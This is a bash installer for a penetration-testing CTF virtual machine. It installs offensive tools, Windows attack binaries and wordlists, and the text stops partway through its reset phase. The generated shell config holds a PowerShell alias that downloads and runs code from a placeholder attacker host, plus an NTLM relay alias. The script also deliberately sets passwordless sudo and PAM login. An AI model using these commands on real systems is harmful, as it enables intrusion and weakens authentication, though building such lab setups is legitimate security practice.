# Dear user - Please consider this, just because you can, doesn't mean you should.
# Please dont be an asshole with this. ask permission. stay out of jail. be responsable.
# This script is 100% free to modify and distrubute as you see fit, but you are not
# allowed to charge for it. the tools are free and thus so should be this script.

# run with sudo bash ./<script>.sh

#!/bin/bash
set -e
# ============================================
# CTFBOX v3.6 — SMART INSTALLER WITH DETECTION
# Debian + Zsh + p10k + VirtualBox Ready
# Now with: Skip existing installs, better error handling, resumable
# ============================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Logging
log_info() { echo -e "${GREEN}[+]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[-]${NC} $1"; }
log_progress() { echo -e "${BLUE}[*]${NC} $1"; }
log_skip() { echo -e "${MAGENTA}[SKIP]${NC} $1"; }

# Capture original user
ORIGINAL_USER="${SUDO_USER:-$USER}"
[[ "$ORIGINAL_USER" == "root" ]] && ORIGINAL_USER=""

# Username validation
validate_username() {
    local username="$1"
    if [[ ! "$username" =~ ^[a-z_][a-z0-9_-]{0,31}$ ]]; then
        log_error "Invalid username format"
        return 1
    fi
    local reserved=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail" "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "nobody")
    for reserved_name in "${reserved[@]}"; do
        [[ "$username" == "$reserved_name" ]] && log_error "Cannot use reserved username: $username" && return 1
    done
    return 0
}

# Check if command exists
command_exists() {
    command -v "$1" &>/dev/null
}

# Check if package is installed
package_installed() {
    dpkg -l "$1" 2>/dev/null | grep -q "^ii"
}

# Safe download with retry
safe_download() {
    local url="$1"
    local output="$2"
    local name=$(basename "$output")
    
    if [[ -f "$output" ]]; then
        log_skip "$name already exists"
        return 0
    fi
    
    if wget --timeout=15 --tries=3 -q "$url" -O "$output" 2>&1 | tee -a /var/log/ctfbox-install.log; then
        log_info "Downloaded: $name"
        return 0
    else
        log_warn "Failed to download: $name (non-critical)"
        return 1
    fi
}

# Safe git clone
safe_clone() {
    local url="$1"
    local dest="$2"
    local name=$(basename "$dest")
    
    if [[ -d "$dest/.git" ]]; then
        log_skip "$name already cloned"
        return 0
    fi
    
    if git clone --depth 1 "$url" "$dest" 2>&1 | tee -a /var/log/ctfbox-install.log; then
        log_info "Cloned: $name"
        return 0
    else
        log_warn "Failed to clone: $name"
        return 1
    fi
}

# Welcome
clear
echo -e "${CYAN}"
cat << 'EOF'
╔═══════════════════════════════════════════════════════════════╗
║     ██████╗████████╗███████╗    ██████╗  ██████╗ ██╗  ██╗     ║
║    ██╔════╝╚══██╔══╝██╔════╝    ██╔══██╗██╔═══██╗╚██╗██╔╝     ║
║    ██║         ██║  █████╗      ██████╔╝██║   ██║ ╚███╔╝      ║
║    ██║         ██║  ██╔══╝      ██╔══██╗██║   ██║ ██╔██╗      ║
║    ╚██████╗    ██║  ██║         ██████╔╝╚██████╔╝██╔╝ ██╗     ║
║     ╚═════╝    ╚═╝  ╚═╝         ╚═════╝  ╚═════╝ ╚═╝  ╚═╝     ║
║                                                               ║
║            PENTESTING TOOLKIT INSTALLER v3.6                  ║
║            Smart Detection + Skip Existing                    ║
║            A love letter to Pentesting by Jamie Loring        ║
╚═══════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}\n"

DEFAULT_USERNAME="$USER"
while true; do
    read -p "Enter pentesting username [default: $DEFAULT_USERNAME]: " USERNAME
    USERNAME="${USERNAME:-$DEFAULT_USERNAME}"
    validate_username "$USERNAME" && break
done
export USERNAME
export USER_HOME="/home/$USERNAME"
mkdir -p "$USER_HOME"
log_info "Username: ${GREEN}$USERNAME${NC}"
echo ""
log_warn "This will install tools (smart detection enabled - skips existing)"
read -p "Continue? (y/n): " confirm
[[ "$confirm" != "y" ]] && [[ "$confirm" != "Y" ]] && exit 0

# ============================================
# PHASE 1: SYSTEM SETUP
# ============================================
log_progress "Phase 1: System Updates & Base Packages"

# Setup non-interactive mode
export DEBIAN_FRONTEND=noninteractive
export NEEDRESTART_MODE=a
export NEEDRESTART_SUSPEND=1
echo 'debconf debconf/frontend select Noninteractive' | debconf-set-selections
mkdir -p /etc/needrestart/conf.d
cat > /etc/needrestart/conf.d/no-prompt.conf << 'EOF'
$nrconf{restart} = 'a';
$nrconf{kernelhints} = 0;
EOF

# Update package lists
log_info "Updating package lists..."
apt update -qq 2>&1 | tee -a /var/log/ctfbox-install.log

# Upgrade system (only if needed)
if apt list --upgradable 2>/dev/null | grep -q "upgradable"; then
    log_info "Upgrading system packages..."
    DEBIAN_FRONTEND=noninteractive apt upgrade -y -qq 2>&1 | tee -a /var/log/ctfbox-install.log
else
    log_skip "System already up to date"
fi

# Install base packages (check first)
log_info "Installing base packages..."
PACKAGES=(
    build-essential git curl wget vim neovim tmux zsh
    python3-pip python3-venv golang-go rustc cargo
    docker.io docker-compose jq ripgrep fd-find bat
    htop ncdu tree fonts-powerline silversearcher-ag
    john john-data hashcat sqlmap
    mingw-w64 mingw-w64-tools
    p7zip-full unzip zip
    net-tools dnsutils
)

PACKAGES_TO_INSTALL=()
for pkg in "${PACKAGES[@]}"; do
    if ! package_installed "$pkg"; then
        PACKAGES_TO_INSTALL+=("$pkg")
    fi
done

if [[ ${#PACKAGES_TO_INSTALL[@]} -gt 0 ]]; then
    log_info "Installing ${#PACKAGES_TO_INSTALL[@]} new packages..."
    DEBIAN_FRONTEND=noninteractive apt install -y -qq "${PACKAGES_TO_INSTALL[@]}" 2>&1 | tee -a /var/log/ctfbox-install.log || true
else
    log_skip "All base packages already installed"
fi

# ============================================
# PHASE 1.5: VIRTUALBOX GUEST ADDITIONS
# ============================================
log_progress "Phase 1.5: VirtualBox Guest Additions"

if hostnamectl | grep -i 'virtualization.*oracle' >/dev/null 2>&1; then
    if package_installed "virtualbox-guest-dkms"; then
        log_skip "VirtualBox Guest Additions already installed"
    else
        log_info "Installing VirtualBox Guest Additions..."
        DEBIAN_FRONTEND=noninteractive apt install -y -qq \
            virtualbox-guest-dkms virtualbox-guest-utils virtualbox-guest-x11 \
            2>&1 | tee -a /var/log/ctfbox-install.log || true
    fi

    # Enable clipboard and drag-and-drop
    pkill -f VBoxClient 2>/dev/null || true
    VBoxClient --clipboard &>/dev/null &
    VBoxClient --draganddrop &>/dev/null &

    # Autostart on login
    mkdir -p "$USER_HOME/.config/autostart"
    if [[ ! -f "$USER_HOME/.config/autostart/vboxclient-clipboard.desktop" ]]; then
        cat > "$USER_HOME/.config/autostart/vboxclient-clipboard.desktop" << 'EOF'
[Desktop Entry]
Type=Application
Exec=/usr/bin/VBoxClient --clipboard
Hidden=false
X-GNOME-Autostart-enabled=true
Name=VBoxClient Clipboard
Comment=Enable bidirectional clipboard
EOF
    fi
    
    if [[ ! -f "$USER_HOME/.config/autostart/vboxclient-dnd.desktop" ]]; then
        cat > "$USER_HOME/.config/autostart/vboxclient-dnd.desktop" << 'EOF'
[Desktop Entry]
Type=Application
Exec=/usr/bin/VBoxClient --draganddrop
Hidden=false
X-GNOME-Autostart-enabled=true
Name=VBoxClient Drag and Drop
Comment=Enable drag and drop
EOF
    fi
    chown -R "$USERNAME":"$USERNAME" "$USER_HOME/.config/autostart" 2>/dev/null || true
    log_info "VirtualBox Guest Additions configured"
else
    log_skip "Not in VirtualBox - skipping Guest Additions"
fi

# ============================================
# PHASE 2: USER SETUP
# ============================================
log_progress "Phase 2: User Account Configuration"

if ! id "$USERNAME" &>/dev/null; then
    log_info "Creating user: $USERNAME"
    useradd -m -s /bin/zsh -G sudo,docker "$USERNAME"
    passwd -d "$USERNAME" || true
    log_info "User '$USERNAME' created"
else
    log_skip "User '$USERNAME' already exists"
fi

# Sudoers
if [[ ! -f "/etc/sudoers.d/$USERNAME" ]]; then
    echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/"$USERNAME"
    chmod 440 /etc/sudoers.d/"$USERNAME"
    log_info "Sudoers configured for $USERNAME"
else
    log_skip "Sudoers already configured"
fi

chown -R "$USERNAME":"$USERNAME" "$USER_HOME" 2>/dev/null || true

# Set default shell to zsh
if [[ "$(getent passwd "$USERNAME" | cut -d: -f7)" != "$(which zsh)" ]]; then
    chsh -s "$(which zsh)" "$USERNAME" 2>/dev/null || true
    log_info "Default shell set to zsh"
else
    log_skip "Shell already set to zsh"
fi

# Disable old user auto-login if exists (common on Parrot OS default install)
if [[ "$USERNAME" != "user" ]]; then
    log_progress "Checking for existing auto-login configuration..."
    
    # Check and fix LightDM
    if [[ -f "/etc/lightdm/lightdm.conf.d/50-autologin.conf" ]]; then
        if grep -q "autologin-user=user" /etc/lightdm/lightdm.conf.d/50-autologin.conf 2>/dev/null; then
            log_info "Removing old 'user' auto-login from LightDM"
            rm -f /etc/lightdm/lightdm.conf.d/50-autologin.conf
        fi
    fi
    
    # Check main lightdm.conf
    if [[ -f "/etc/lightdm/lightdm.conf" ]]; then
        if grep -q "autologin-user=user" /etc/lightdm/lightdm.conf 2>/dev/null; then
            log_info "Disabling old 'user' auto-login in main LightDM config"
            sed -i 's/^autologin-user=user/#autologin-user=user/' /etc/lightdm/lightdm.conf
        fi
    fi
    
    # Check and fix GDM3
    if [[ -f "/etc/gdm3/custom.conf" ]]; then
        if grep -q "AutomaticLogin = user" /etc/gdm3/custom.conf 2>/dev/null; then
            log_info "Removing old 'user' auto-login from GDM3"
            sed -i '/AutomaticLogin = user/d' /etc/gdm3/custom.conf
            sed -i '/AutomaticLoginEnable = true/d' /etc/gdm3/custom.conf
        fi
    fi
fi

# Auto-login configuration
AUTOLOGIN_CONFIGURED=false

# Check if auto-login is already set for this user
if [[ -f "/etc/lightdm/lightdm.conf.d/50-autologin.conf" ]]; then
    if grep -q "autologin-user=$USERNAME" /etc/lightdm/lightdm.conf.d/50-autologin.conf 2>/dev/null; then
        AUTOLOGIN_CONFIGURED=true
    fi
elif [[ -f "/etc/gdm3/custom.conf" ]]; then
    if grep -q "AutomaticLogin = $USERNAME" /etc/gdm3/custom.conf 2>/dev/null; then
        AUTOLOGIN_CONFIGURED=true
    fi
elif [[ -f "/etc/sddm.conf.d/autologin.conf" ]]; then
    if grep -q "User=$USERNAME" /etc/sddm.conf.d/autologin.conf 2>/dev/null; then
        AUTOLOGIN_CONFIGURED=true
    fi
fi

if [[ "$AUTOLOGIN_CONFIGURED" == "false" ]]; then
    echo ""
    read -p "Enable auto-login for $USERNAME (recommended for CTF VM)? (y/n): " auto_login
    if [[ "$auto_login" =~ ^[Yy]$ ]]; then
        log_progress "Configuring auto-login for $USERNAME..."
        
        # LightDM (most common on Parrot OS)
        if [[ -d "/etc/lightdm" ]]; then
            mkdir -p /etc/lightdm/lightdm.conf.d
            cat > /etc/lightdm/lightdm.conf.d/50-autologin.conf << EOF
[Seat:*]
autologin-user=$USERNAME
autologin-user-timeout=0
allow-guest=false
EOF
            log_info "LightDM auto-login configured for $USERNAME"
        fi
        
        # GDM3
        if [[ -f "/etc/gdm3/custom.conf" ]]; then
            # Remove old auto-login settings
            sed -i '/AutomaticLoginEnable/d' /etc/gdm3/custom.conf 2>/dev/null || true
            sed -i '/AutomaticLogin =/d' /etc/gdm3/custom.conf 2>/dev/null || true
            
            # Add new settings
            if grep -q '^\[daemon\]' /etc/gdm3/custom.conf; then
                sed -i "/^\[daemon\]/a AutomaticLoginEnable = true" /etc/gdm3/custom.conf
                sed -i "/^\[daemon\]/a AutomaticLogin = $USERNAME" /etc/gdm3/custom.conf
            else
                echo -e "\n[daemon]\nAutomaticLoginEnable = true\nAutomaticLogin = $USERNAME" >> /etc/gdm3/custom.conf
            fi
            log_info "GDM3 auto-login configured for $USERNAME"
        fi
        
        # SDDM
        if [[ -d "/etc/sddm.conf.d" ]] || [[ -f "/etc/sddm.conf" ]]; then
            mkdir -p /etc/sddm.conf.d
            cat > /etc/sddm.conf.d/autologin.conf << EOF
[Autologin]
User=$USERNAME
Session=plasma.desktop
EOF
            log_info "SDDM auto-login configured for $USERNAME"
        fi
        
        log_info "Auto-login enabled - you'll boot directly into $USERNAME after reboot"
    else
        log_info "Auto-login skipped - manual login required"
    fi
else
    log_skip "Auto-login already configured for $USERNAME"
fi

# Passwordless login group
if ! grep -q '^nopasswdlogin:' /etc/group; then
    groupadd nopasswdlogin || true
    log_info "Created nopasswdlogin group"
fi
usermod -aG nopasswdlogin "$USERNAME" || true

if ! grep -q 'pam_succeed_if.so user ingroup nopasswdlogin' /etc/pam.d/common-auth; then
    sed -i '1i auth [success=1 default=ignore] pam_succeed_if.so user ingroup nopasswdlogin' /etc/pam.d/common-auth
    log_info "PAM configured for passwordless login"
else
    log_skip "PAM already configured"
fi

# ============================================
# PHASE 3: SHELL ENVIRONMENT
# ============================================
log_progress "Phase 3: Shell Environment (Zsh + Oh-My-Zsh + p10k)"

if [[ ! -d "$USER_HOME/.oh-my-zsh" ]]; then
    log_info "Installing Oh-My-Zsh..."
    TEMP_HOME="/tmp/user-setup-$USERNAME"
    rm -rf "$TEMP_HOME" 2>/dev/null || true
    mkdir -p "$TEMP_HOME"
    export HOME="$TEMP_HOME"
    sh -c "RUNZSH=no $(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended 2>&1 | tee -a /var/log/ctfbox-install.log || true
    export HOME="/root"
    
    # Install plugins
    git clone https://github.com/zsh-users/zsh-autosuggestions "${TEMP_HOME}/.oh-my-zsh/custom/plugins/zsh-autosuggestions" 2>/dev/null || true
    git clone https://github.com/zsh-users/zsh-syntax-highlighting.git "${TEMP_HOME}/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting" 2>/dev/null || true
    git clone --depth=1 https://github.com/romkatv/powerlevel10k.git "${TEMP_HOME}/.oh-my-zsh/custom/themes/powerlevel10k" 2>/dev/null || true
    
    # Download p10k config
    wget -q https://raw.githubusercontent.com/Jamie-loring/Public-scripts/main/p10k-jamie-config.zsh -O "${TEMP_HOME}/.p10k.zsh" 2>/dev/null || log_warn "Failed to download p10k config"
    
    # Copy to user home
    cp -r "$TEMP_HOME"/.oh-my-zsh "$USER_HOME/" 2>/dev/null || true
    cp "$TEMP_HOME"/.p10k.zsh "$USER_HOME/" 2>/dev/null || true
    chown -R "$USERNAME":"$USERNAME" "$USER_HOME/.oh-my-zsh" "$USER_HOME/.p10k.zsh" 2>/dev/null || true
    rm -rf "$TEMP_HOME"
    log_info "Oh-My-Zsh installed with plugins"
else
    log_skip "Oh-My-Zsh already installed"
fi

# ============================================
# PHASE 4: TOOLS INSTALLATION
# ============================================
log_progress "Phase 4: Installing Pentesting Tools"
mkdir -p "$USER_HOME"/tools/{wordlists,scripts,exploits,repos,windows}

# Python tools
log_progress "Installing Python tools..."

# Check if pipx is available
if ! command_exists pipx; then
    log_info "Installing pipx..."
    DEBIAN_FRONTEND=noninteractive apt install -y pipx 2>&1 | tee -a /var/log/ctfbox-install.log || true
    pipx ensurepath || true
    export PATH="$PATH:/root/.local/bin:$USER_HOME/.local/bin"
fi

# Python packages via pip
PIP_TOOLS=(
    "impacket"
    "hashid"
    "featherduster"
    "bloodhound"
    "bloodyAD"
    "mitm6"
    "responder"
    "certipy-ad"
    "coercer"
    "pypykatz"
    "lsassy"
    "enum4linux-ng"
    "dnsrecon"
    "git-dumper"
    "roadrecon"
    "manspider"
    "mitmproxy"
    "pwntools"
    "ROPgadget"
    "truffleHog"
)

for tool in "${PIP_TOOLS[@]}"; do
    if ! pip3 list 2>/dev/null | grep -qi "^${tool} "; then
        pip3 install --break-system-packages "$tool" 2>&1 | tee -a /var/log/ctfbox-install.log || log_warn "Failed to install $tool"
    else
        log_skip "$tool already installed"
    fi
done

# Pipx tools
PIPX_TOOLS=(
    "git+https://github.com/Pennyw0rth/NetExec"
    "ldapdomaindump"
    "sprayhound"
    "RsaCtfTool"
)

for tool in "${PIPX_TOOLS[@]}"; do
    tool_name=$(basename "$tool" | cut -d'@' -f1 | sed 's/git+https:\/\/github.com\///' | cut -d'/' -f2)
    if ! pipx list 2>/dev/null | grep -qi "$tool_name"; then
        pipx install "$tool" 2>&1 | tee -a /var/log/ctfbox-install.log || log_warn "Failed to install $tool_name via pipx"
    else
        log_skip "$tool_name already installed"
    fi
done

# Go tools
if command_exists go; then
    log_progress "Installing Go tools..."
    
    GO_TOOLS=(
        "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
        "github.com/projectdiscovery/httpx/cmd/httpx@latest"
        "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
        "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
        "github.com/projectdiscovery/katana/cmd/katana@latest"
        "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
        "github.com/ffuf/ffuf@latest"
        "github.com/OJ/gobuster/v3@latest"
        "github.com/ropnop/kerbrute@latest"
        "github.com/jpillora/chisel@latest"
        "github.com/bp0lr/gauplus@latest"
        "github.com/ropnop/windapsearch@latest"
        "github.com/garrettfoster13/pre2k@latest"
        "github.com/nicocha30/ligolo-ng/cmd/proxy@latest"
        "github.com/nicocha30/ligolo-ng/cmd/agent@latest"
    )
    
    export GOPATH="$USER_HOME/go"
    mkdir -p "$GOPATH/bin"
    
    for tool_path in "${GO_TOOLS[@]}"; do
        tool_name=$(basename "$tool_path" | cut -d'@' -f1)
        if [[ ! -f "$GOPATH/bin/$tool_name" ]]; then
            sudo -u "$USERNAME" bash -c "export GOPATH='$GOPATH'; export PATH=\$PATH:\$GOPATH/bin; go install -v $tool_path" 2>&1 | tee -a /var/log/ctfbox-install.log || log_warn "Failed to install $tool_name"
        else
            log_skip "$tool_name already installed"
        fi
    done
    
    chown -R "$USERNAME":"$USERNAME" "$GOPATH" 2>/dev/null || true
else
    log_warn "Go not found, skipping Go tools"
fi

# Ruby tools
if command_exists gem; then
    log_progress "Installing Ruby tools..."
    
    RUBY_TOOLS=("one_gadget" "haiti-hash" "evil-winrm")
    
    for tool in "${RUBY_TOOLS[@]}"; do
        if ! gem list -i "^${tool}$" &>/dev/null; then
            gem install "$tool" 2>&1 | tee -a /var/log/ctfbox-install.log || log_warn "Failed to install $tool"
        else
            log_skip "$tool already installed"
        fi
    done
else
    log_warn "Ruby not found, skipping Ruby tools"
fi

# Ysoserial
if command_exists java; then
    if [[ ! -f "$USER_HOME/tools/ysoserial.jar" ]]; then
        log_info "Downloading ysoserial.jar..."
        safe_download "https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar" "$USER_HOME/tools/ysoserial.jar"
    else
        log_skip "ysoserial.jar already exists"
    fi
else
    log_warn "Java not found. Skipping ysoserial download."
fi

# ============================================
# PHASE 4.5: RUNASCS + PRE-COMPILED WINDOWS BINARIES
# ============================================
log_progress "Phase 4.5: Compiling & Downloading runasCs + Win Binaries"
mkdir -p "$USER_HOME/tools/windows"

# Compile runasCs (x86_64)
if command_exists x86_64-w64-mingw32-gcc; then
    if [[ ! -f "$USER_HOME/tools/windows/runasCs.exe" ]]; then
        log_info "Attempting to compile runasCs.exe..."
        if wget --timeout=15 --tries=3 -q https://raw.githubusercontent.com/antonioCoco/RunasCs/master/RunasCs.c -O /tmp/RunasCs.c 2>&1 | tee -a /var/log/ctfbox-install.log; then
            if x86_64-w64-mingw32-gcc /tmp/RunasCs.c -o "$USER_HOME/tools/windows/runasCs.exe" -lwininet -lws2_32 -static 2>&1 | tee -a /var/log/ctfbox-install.log; then
                log_info "runasCs.exe compiled successfully"
            else
                log_warn "runasCs compilation failed (non-critical)"
            fi
            rm -f /tmp/RunasCs.c
        else
            log_warn "Failed to download RunasCs.c (non-critical)"
        fi
    else
        log_skip "runasCs.exe already exists"
    fi
else
    log_warn "MinGW not found. Skipping runasCs compile."
fi

# Download pre-compiled Windows tools
log_progress "Downloading pre-compiled Windows binaries..."
safe_download "https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1" "$USER_HOME/tools/windows/PowerView.ps1"
safe_download "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" "$USER_HOME/tools/windows/Rubeus.exe"
safe_download "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpHound.exe" "$USER_HOME/tools/windows/SharpHound.exe"
safe_download "https://github.com/Flangvik/SharpCollection/raw/master/net48/Seatbelt.exe" "$USER_HOME/tools/windows/Seatbelt.exe"

chown -R "$USERNAME":"$USERNAME" "$USER_HOME/tools/windows" 2>/dev/null || true

# ============================================
# PHASE 5: WORDLISTS
# ============================================
log_progress "Phase 5: Downloading Wordlists"

if [[ ! -d "$USER_HOME/tools/wordlists/SecLists/.git" ]]; then
    log_info "Cloning SecLists (~700MB)..."
    safe_clone "https://github.com/danielmiessler/SecLists.git" "$USER_HOME/tools/wordlists/SecLists"
else
    log_skip "SecLists already exists"
fi

# Decompress rockyou if needed
if [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]] && [[ ! -f "/usr/share/wordlists/rockyou.txt" ]]; then
    log_info "Decompressing rockyou.txt..."
    gunzip /usr/share/wordlists/rockyou.txt.gz || true
elif [[ -f "/usr/share/wordlists/rockyou.txt" ]]; then
    log_skip "rockyou.txt already decompressed"
fi

# Create symlinks
[[ ! -L "$USER_HOME/SecLists" ]] && ln -sf "$USER_HOME/tools/wordlists/SecLists" "$USER_HOME/SecLists" 2>/dev/null || true
[[ ! -L "$USER_HOME/tools/wordlists/rockyou.txt" ]] && ln -sf /usr/share/wordlists/rockyou.txt "$USER_HOME/tools/wordlists/rockyou.txt" 2>/dev/null || true

# ============================================
# PHASE 6: REPOSITORIES
# ============================================
log_progress "Phase 6: Cloning Essential Repositories"

REPOS=(
    "https://github.com/swisskyrepo/PayloadsAllTheThings.git"
    "https://github.com/peass-ng/PEASS-ng.git"
    "https://github.com/HackTricks-wiki/HackTricks.git"
    "https://github.com/Tib3rius/AutoRecon.git"
    "https://github.com/fortra/impacket.git"
    "https://github.com/projectdiscovery/nuclei-templates.git"
    "https://github.com/internetwache/GitTools.git"
    "https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git"
    "https://github.com/PowerShellMafia/PowerSploit.git"
    "https://github.com/GTFOBins/GTFOBins.github.io.git"
    "https://github.com/LOLBAS-Project/LOLBAS.git"
    "https://github.com/RsaCtfTool/RsaCtfTool.git"
    "https://github.com/brightio/penelope.git"
)

for repo in "${REPOS[@]}"; do
    name=$(basename "$repo" .git)
    safe_clone "$repo" "$USER_HOME/tools/repos/$name"
done

# Create convenience symlinks
[[ ! -L "$USER_HOME/linpeas.sh" ]] && ln -sf "$USER_HOME/tools/repos/PEASS-ng/linPEAS/linpeas.sh" "$USER_HOME/linpeas.sh" 2>/dev/null || true
[[ ! -L "$USER_HOME/winpeas.exe" ]] && ln -sf "$USER_HOME/tools/repos/PEASS-ng/winPEAS/winPEASx64.exe" "$USER_HOME/winpeas.exe" 2>/dev/null || true
[[ ! -L "$USER_HOME/penelope.py" ]] && ln -sf "$USER_HOME/tools/repos/penelope/penelope.py" "$USER_HOME/penelope.py" 2>/dev/null || true

# ============================================
# PHASE 7: DOTFILES & SCRIPTS
# ============================================
log_progress "Phase 7: Creating Dotfiles & Scripts"
mkdir -p "$USER_HOME/scripts" "$USER_HOME/Desktop"

# .zshrc
if [[ ! -f "$USER_HOME/.zshrc" ]] || ! grep -q "CTFBOX v3.6" "$USER_HOME/.zshrc"; then
    log_info "Creating .zshrc configuration..."
    cat > "$USER_HOME/.zshrc" << 'ZSH_EOF'
# CTFBOX v3.6 Configuration
export ZSH="$HOME/.oh-my-zsh"
ZSH_THEME="powerlevel10k/powerlevel10k"
plugins=(git zsh-autosuggestions zsh-syntax-highlighting docker sudo history command-not-found)
source $ZSH/oh-my-zsh.sh
[[ -f ~/.p10k.zsh ]] && source ~/.p10k.zsh

# Environment
export PATH=$PATH:$HOME/go/bin:$HOME/.local/bin
export EDITOR=vim
export GOPATH=$HOME/go

# Auto-update nuclei templates in background
(nuclei -update-templates -silent &>/dev/null &)

# System aliases
alias ll='ls -lah'
alias ...='cd ../..'
alias c='clear'
alias h='history'
alias please='sudo'
alias rl='rlwrap nc'

# Pentesting aliases
alias nmap-quick='nmap -sV -sC -O'
alias nmap-full='nmap -sV -sC -O -p-'
alias nmap-udp='nmap -sU -sV'
alias serve='python3 -m http.server'
alias serve80='sudo python3 -m http.server 80'
alias myip='curl -s ifconfig.me && echo'
alias ports='netstat -tulanp'
alias listening='lsof -i -P -n | grep LISTEN'
alias hash='hashid'
alias shell='python3 ~/penelope.py'

# Cracking
alias john='john --wordlist=~/tools/wordlists/rockyou.txt'
alias hashcat='hashcat -m 1000'
alias sqlmap='sqlmap'

# Tool shortcuts
alias nxc='netexec'
alias cme='netexec'
alias smb='netexec smb'
alias winrm='netexec winrm'
alias bloodhound='bloodhound-python'
alias peas='linpeas.sh'
alias ysoserial='java -jar ~/tools/ysoserial.jar'
alias evil='evil-winrm'
alias ldump='ldapdomaindump'
alias runas='wine ~/tools/windows/runasCs.exe'

# Windows Tools
alias powerview='powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(''http://$ATTACKER/PowerView.ps1'')"'
alias rubeus='~/tools/windows/Rubeus.exe'
alias sharphound='~/tools/windows/SharpHound.exe'
alias seatbelt='~/tools/windows/Seatbelt.exe'

# Impacket shortcuts
alias secretsdump='secretsdump.py'
alias getnpusers='GetNPUsers.py'
alias getuserspns='GetUserSPNs.py'
alias psexec='psexec.py'
alias smbexec='smbexec.py'
alias wmiexec='wmiexec.py'
alias ntlmrelayx='ntlmrelayx.py'

# Wordlist shortcuts
alias wl-common='~/tools/wordlists/SecLists/Discovery/Web-Content/common.txt'
alias wl-dir='~/tools/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt'
alias wl-users='~/tools/wordlists/SecLists/Usernames/Names/names.txt'
alias wl-pass='~/tools/wordlists/rockyou.txt'
alias wl-params='~/tools/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt'

# Chisel shortcuts
alias chisel-server='chisel server --reverse --port 8000'
alias chisel-client='chisel client'

# Combo attacks
alias mitm-relay='sudo mitm6 -d DOMAIN & ntlmrelayx.py -t ldaps://DC-IP -wh attacker-ip --delegate-access'

# Navigation
alias tools='cd ~/tools'
alias repos='cd ~/tools/repos'
alias wordlists='cd ~/tools/wordlists'
alias scripts='cd ~/tools/scripts'
alias engagements='cd ~/engagements'
alias win='cd ~/tools/windows'

# VM Tools
[[ -d "/media/sf_ctf-tools" ]] && alias host='cd /media/sf_ctf-tools'
[[ -d "/media/ctf-tools" ]] && alias host='cd /media/ctf-tools'

# Functions
newengagement() {
    [[ -z "$1" ]] && echo "Usage: newengagement <name>" && return 1
    mkdir -p ~/engagements/$1/{recon,scans,exploits,loot,notes,screenshots}
    cd ~/engagements/$1
    echo "# $1 Engagement" > notes/README.md
    echo "Created: $1"
    ls -la
}

quickscan() {
    [[ -z "$1" ]] && echo "Usage: quickscan <target>" && return 1
    nmap -sV -sC -O -oA quickscan_$(date +%Y%m%d_%H%M%S) $1
}

extract() {
    if [[ -f $1 ]]; then
        case $1 in
            *.tar.bz2) tar xjf $1 ;;
            *.tar.gz) tar xzf $1 ;;
            *.bz2) bunzip2 $1 ;;
            *.rar) unrar e $1 ;;
            *.gz) gunzip $1 ;;
            *.tar) tar xf $1 ;;
            *.tbz2) tar xjf $1 ;;
            *.tgz) tar xzf $1 ;;
            *.zip) unzip $1 ;;
            *.Z) uncompress $1 ;;
            *.7z) 7z x $1 ;;
            *) echo "'$1' cannot be extracted" ;;
        esac
    else
        echo "'$1' is not a valid file"
    fi
}
ZSH_EOF
    chown "$USERNAME":"$USERNAME" "$USER_HOME/.zshrc"
else
    log_skip ".zshrc already configured"
fi

# update-tools.sh
if [[ ! -f "$USER_HOME/scripts/update-tools.sh" ]]; then
    log_info "Creating update-tools.sh..."
    cat > "$USER_HOME/scripts/update-tools.sh" << 'UPDATE_EOF'
#!/bin/bash
echo "[+] Updating system..."
sudo apt update && sudo apt upgrade -y

echo "[+] Updating Python tools..."
pip3 install --upgrade --break-system-packages impacket bloodhound bloodyAD certipy-ad pypykatz lsassy pwntools ROPgadget truffleHog || true

echo "[+] Updating pipx tools..."
pipx upgrade-all || true

echo "[+] Updating Go tools..."
export GOPATH=$HOME/go
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/ffuf/ffuf@latest
go install -v github.com/OJ/gobuster/v3@latest
go install -v github.com/jpillora/chisel@latest
go install -v github.com/ropnop/windapsearch@latest
go install -v github.com/garrettfoster13/pre2k@latest
go install -v github.com/nicocha30/ligolo-ng/cmd/proxy@latest
go install -v github.com/nicocha30/ligolo-ng/cmd/agent@latest

echo "[+] Updating nuclei templates..."
nuclei -update-templates

echo "[+] Updating Ruby tools..."
gem update one_gadget haiti-hash evil-winrm || true

echo "[+] Updating repositories..."
cd ~/tools/repos || exit 0
for dir in */; do
    echo "[*] Updating $dir"
    cd "$dir" && git pull && cd ..
done

echo "[+] Done!"
UPDATE_EOF
    chmod +x "$USER_HOME/scripts/update-tools.sh"
    chown "$USERNAME":"$USERNAME" "$USER_HOME/scripts/update-tools.sh"
else
    log_skip "update-tools.sh already exists"
fi

# ============================================
# PHASE 8: RESET SCRIPT
# ============================================
log_progress "Phase 8: Installing RESET_CTF_BOX.sh"

if [[ ! -f "$USER_HOME/Desktop/RESET_CTF_BOX.sh" ]]; then
